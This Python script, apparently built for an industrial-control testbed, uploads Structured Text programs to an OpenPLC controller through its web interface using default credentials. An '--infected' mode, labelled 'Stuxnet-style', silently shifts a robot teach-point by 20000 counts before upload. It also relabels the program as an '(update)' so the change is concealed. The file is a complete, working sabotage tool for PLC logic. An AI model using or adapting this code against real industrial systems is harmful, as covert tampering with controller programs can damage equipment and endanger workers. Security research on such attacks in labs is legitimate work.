import argparse
import re
import sys
import urllib.parse
import urllib.request

TEACH_LINE = re.compile(r'(TEACH\[(\d+)\]\[(\d+)\]\s*:=\s*)(-?\d+)(\s*;)')


def tamper_program(text, station, joint, bias_counts):
    def replace(match):
        s, joint_index = int(match.group(2)), int(match.group(3))
        if s == station and joint_index == joint:
            value = int(match.group(4)) + int(bias_counts)
            return f'{match.group(1)}{value}{match.group(5)}'
        return match.group(0)
    new_text, count = TEACH_LINE.subn(replace, text)
    if count == 0:
        raise ValueError('no TEACH[..][..] assignments found to tamper')
    return new_text


def login(opener, base, user, password):
    data = urllib.parse.urlencode({'username': user, 'password': password}).encode()
    opener.open(f'{base}/login', data=data, timeout=10).read()


def upload_program(base, user, password, name, description, st_text):
    import http.cookiejar
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    login(opener, base, user, password)
    boundary = '----engwsupdate'
    parts = []
    for field, value in (('prog_name', name), ('prog_descr', description)):
        parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="{field}"\r\n\r\n'
                     f'{value}\r\n')
    parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="file"; '
                 f'filename="{name}.st"\r\nContent-Type: application/octet-stream\r\n\r\n'
                 f'{st_text}\r\n--{boundary}--\r\n')
    body = ''.join(parts).encode()
    request = urllib.request.Request(f'{base}/upload-program', data=body)
    request.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
    opener.open(request, timeout=20).read()
    compile_request = urllib.request.Request(
        f'{base}/reload-program', data=urllib.parse.urlencode({'table_id': name}).encode())
    opener.open(compile_request, timeout=60).read()


def main(argv=None):
    parser = argparse.ArgumentParser(
        description='Engineering-workstation PLC update tool (benign, or the infected '
                    'Stuxnet-style variant that tampers a teach-point before upload).')
    parser.add_argument('program', help='Structured Text file to upload')
    parser.add_argument('--host', default='http://10.203.10.20:8080')
    parser.add_argument('--user', default='openplc')
    parser.add_argument('--password', default='openplc')
    parser.add_argument('--name', default='cell')
    parser.add_argument('--infected', action='store_true',
                        help='tamper a teach-point before upload')
    parser.add_argument('--station', type=int, default=1)
    parser.add_argument('--joint', type=int, default=3)
    parser.add_argument('--bias-counts', type=int, default=20000)
    parser.add_argument('--dry-run', action='store_true', help='print the program, do not upload')
    args = parser.parse_args(argv)
    with open(args.program) as f:
        text = f.read()
    description = 'cell sequencer'
    if args.infected:
        text = tamper_program(text, args.station, args.joint, args.bias_counts)
        description = 'cell sequencer (update)'
        print(f'tampered TEACH[{args.station}][{args.joint}] by {args.bias_counts} counts',
              file=sys.stderr)
    if args.dry_run:
        sys.stdout.write(text)
        return 0
    upload_program(args.host, args.user, args.password, args.name, description, text)
    print(f'uploaded {args.name} to {args.host}')
    return 0


if __name__ == '__main__':
    sys.exit(main())